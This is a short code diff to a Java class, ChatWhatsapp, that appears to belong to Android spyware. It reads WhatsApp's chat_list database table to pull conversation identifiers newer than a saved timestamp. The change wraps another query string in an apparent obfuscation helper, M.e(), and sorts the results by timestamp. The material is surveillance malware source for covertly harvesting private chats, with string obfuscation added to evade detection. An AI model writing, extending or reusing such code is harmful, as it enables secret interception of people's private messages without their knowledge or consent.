@@ -300,13 +300,14 @@ public class ChatWhatsapp extends SubModuleChat {
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.3=chat_list
 		queryBuilderIndex.setTables(M.e("chat_list"));
-		queryBuilderIndex.appendWhere("sort_timestamp > " + lastWhatsapp);
+		queryBuilderIndex.appendWhere(M.e("sort_timestamp > ") + lastWhatsapp);
+
 		// queryBuilder.appendWhere(inWhere);
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f.6=message_table_id
 		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
+		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.e("sort_timestamp"));
 
 		// iterate conversation indexes
 		while (cursor != null && cursor.moveToNext()) {
